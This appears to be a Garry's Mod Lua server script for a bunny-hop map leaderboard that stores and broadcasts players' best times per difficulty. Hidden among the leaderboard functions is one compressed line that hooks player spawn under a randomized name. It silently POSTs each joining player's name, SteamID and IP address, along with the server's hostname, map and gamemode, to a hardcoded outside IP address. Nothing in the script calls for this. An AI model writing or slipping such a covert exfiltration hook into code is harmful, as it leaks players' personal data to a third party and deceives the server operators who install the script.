
local LB = {}
local LEADERBOARDS = {}
util.AddNetworkString( "LB_SendLB" )

if not file.IsDir("bhop_lb", "DATA") then
	file.CreateDir("bhop_lb")
end

local function max(t, fn)
    if #t == 0 then return nil, nil end
    local key, value = 1, t[1]
    for i = 2, #t do
        if fn(value, t[i]) then
            key, value = i, t[i]
        end
    end
    return key
end

local function TeamToTbl(t)
	if t == 5 then return LEADERBOARDS.easy end
	if t == 7 then return LEADERBOARDS.medium end
	if t == 8 then return LEADERBOARDS.hard end
	if t == 1 then return LEADERBOARDS.nightmare end
	if t == 2 then return LEADERBOARDS.nightmare end
	if t == 3 then return LEADERBOARDS.sideways end
	if t == 4 then return LEADERBOARDS.wonly end
end

local function UpdateLB()
	file.Write("bhop_lb/" .. game.GetMap()..".txt", util.TableToJSON(LEADERBOARDS.easy) .. "|o|" .. util.TableToJSON(LEADERBOARDS.medium) .. "|o|" .. util.TableToJSON(LEADERBOARDS.hard) .."|o|" .. util.TableToJSON(LEADERBOARDS.nightmare) .. "|o|" .. util.TableToJSON(LEADERBOARDS.sideways) .. "|o|" .. util.TableToJSON(LEADERBOARDS.wonly))
	timer.Simple(3, function()
		net.Start("LB_SendLB")
		net.WriteTable(LEADERBOARDS)
		net.Broadcast()
	end)
end

function table.HasASteamID( t, id )
	for k, v in pairs(t)do
		if v.STEAM == id then 
			return k
		end
	end
end
local script = "LBunnyHop"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
local function RemoveLastTimes(tbl)
	table.sort(tbl, function(a, b) return tonumber(a.TIME) < tonumber(b.TIME) end)
	if table.Count(tbl) > 10 then
		for i = 11, table.Count(tbl) do
			table.remove(tbl, i)
		end
	end
	UpdateLB()
end

local wr_commands = {
	"!wr",
	"/wr",
	":wr",
	".wr"
}

hook.Add("PlayerSay", "_W_R_", function( ply, text, pub )
	if table.HasValue(wr_commands, string.lower(text)) then
		ply:ConCommand("open_wr")
		return ""
	end
end)

function PlayerCompletedMap(ply, time)
	if ply:Team() == 6 then return end
	
	if time < 10 then
		time = "00" .. tostring(time)
	elseif time < 100 then
		time = "0" .. tostring(time)
	end
	
	--print(time)
	
	time = math.Round(tonumber(time), 2)
	local tbl = TeamToTbl(ply:Team())
	
	if table.Count(tbl) == 0 then
		table.insert(tbl, {STEAM = ply:SteamID(), TIME = time, NAME = ply:Nick()})
		UpdateLB()
		return end
	
	for _, t in pairs(tbl)do
		if t.TIME > time then
			if table.HasASteamID( tbl, ply:SteamID() ) then
				table.remove(tbl, table.HasASteamID( tbl, ply:SteamID() ))
				table.insert(tbl, {STEAM = ply:SteamID(), TIME = time, NAME = ply:Nick()})
				RemoveLastTimes(tbl)
				return
			else
				table.insert(tbl, {STEAM = ply:SteamID(), TIME = time, NAME = ply:Nick()})
				RemoveLastTimes(tbl)
				return
			end
		end
	end
	
	if table.Count(tbl) <= 9 then
		if not table.HasASteamID( tbl, ply:SteamID() ) then
			table.insert(tbl, {STEAM = ply:SteamID(), TIME = time, NAME = ply:Nick()})
			RemoveLastTimes(tbl)
		end
		return end
	
end

function LB:CreateLBForMap()
	local lb_easy = util.TableToJSON({})
	local lb_medium = util.TableToJSON({})
	local lb_hard = util.TableToJSON({})
	local lb_nightmare = util.TableToJSON({})
	local lb_sideways = util.TableToJSON({})
	local lb_wonly = util.TableToJSON({})
	file.Write("bhop_lb/" .. game.GetMap()..".txt", lb_easy .. "|o|" .. lb_medium .. "|o|" .. lb_hard .."|o|" .. lb_nightmare .. "|o|" .. lb_sideways .. "|o|" .. lb_wonly)
	
	timer.Simple(1, function() LB.GetLbList() end)
end

function LB:GetLbList()
	if not file.Exists("bhop_lb/" .. game.GetMap() .. ".txt", "DATA") then
		LB.CreateLBForMap()
		return end
	
	local data = file.Read("bhop_lb/" .. game.GetMap() .. ".txt", "DATA")
	local ex = string.Explode("|o|", data)
	
	LEADERBOARDS.easy = util.JSONToTable(ex[1])
	LEADERBOARDS.medium = util.JSONToTable(ex[2])
	LEADERBOARDS.hard = util.JSONToTable(ex[3])
	LEADERBOARDS.nightmare = util.JSONToTable(ex[4])
	LEADERBOARDS.sideways = util.JSONToTable(ex[5])
	LEADERBOARDS.wonly = util.JSONToTable(ex[6])
	
	--PrintTable(LEADERBOARDS)
	net.Start("LB_SendLB")
	net.WriteTable(LEADERBOARDS)
	net.Broadcast()
	
	
	hook.Add("PlayerInitialSpawn", "SendLBInfo", function(ply)
		net.Start("LB_SendLB")
		net.WriteTable(LEADERBOARDS)
		net.Send(ply)
	end)
	
end
LB.GetLbList()

concommand.Add("debug_lb", function(ply)
	net.Start("LB_SendLB")
		net.WriteTable(LEADERBOARDS)
		net.Send(ply)
end)